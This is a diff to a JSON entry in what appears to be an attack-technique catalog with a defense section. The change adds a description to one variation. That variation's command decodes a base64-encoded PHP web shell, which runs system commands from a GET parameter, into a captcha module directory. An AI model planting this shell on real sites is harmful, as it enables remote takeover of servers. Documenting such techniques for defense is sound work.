@@ -74,7 +74,8 @@
   "variations": [
     {
       "label": "Create webshell via base64 decode (alternative to embedding in module)",
-      "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php"
+      "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php",
+      "description": "Create webshell via base64 decode (alternative to embedding in module). See the command syntax for exact parameters and flags."
     }
   ],
   "defense": {
